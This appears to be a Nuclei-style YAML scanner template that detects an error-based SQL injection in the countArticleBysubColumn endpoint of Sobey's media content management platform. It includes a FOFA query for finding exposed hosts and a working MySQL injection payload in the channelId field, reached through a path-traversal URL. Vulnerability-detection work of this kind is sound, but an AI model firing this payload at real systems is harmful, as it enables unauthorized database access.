id: poc-yaml-sobey-imcmp-countarticlebysubcolumn-sqli
info:
  name: 索贝融合媒体内容管理平台 countArticleBysubColumn SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 索贝融合媒体内容管理平台
    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/sobey-mchEditor/mch/statistics/js/../countArticleBysubColumn"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      channelId=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1944=1944,md5({{t1}})))),0x7e),1944)&token=1&siteCode=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Sobey"
          - "countArticleBysubColumn"
          - "~{{t2}}~"
          - "java.sql.SQLException"
